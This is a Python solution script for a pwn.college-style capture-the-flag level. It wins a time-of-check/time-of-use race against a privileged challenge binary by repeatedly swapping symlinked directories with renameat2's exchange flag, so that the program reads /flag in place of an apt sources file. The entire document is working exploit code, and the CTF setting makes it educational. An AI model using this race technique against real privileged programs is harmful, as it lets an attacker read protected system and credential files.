# Level5
import ctypes
import os
import tempfile
from contextlib import suppress

import pwn
from dojotool import find_challenge


def ctf() -> None:
    root_bin = find_challenge()

    libc = ctypes.CDLL(None)

    def swap(a, b):
        libc.renameat2(-100, a.encode(), -100, b.encode(), 2)

    for count in range(1, 1000):
        print(f"Attempt {count}")
        with suppress(Exception), tempfile.TemporaryDirectory() as tmpdir:
            d1 = tmpdir + "/etc1"
            d2 = tmpdir + "/etc2"
            d3 = tmpdir + "/etc3"

            os.makedirs(d1 + "/apt")
            open(d1 + "/apt/sources.list", "w").close()

            os.symlink("/etc", d2)

            os.makedirs(d3 + "/apt")
            os.symlink("/flag", d3 + "/apt/sources.list")

            with pwn.process([root_bin, d1 + "/apt/sources.list"], raw=True, level="error") as io:
                # io.recvuntil(b"Paused")
                # io.sendline()

                # io.recvuntil(b"Paused")
                swap(d2, d1)
                # io.sendline()

                # io.recvuntil(b"Paused")
                swap(d3, d1)
                # io.sendline()
                data = io.recvrepeat().decode(errors="ignore")
                if "pwn.college{" in data:
                    print(data)
                    break


if __name__ == "__main__":
    ctf()
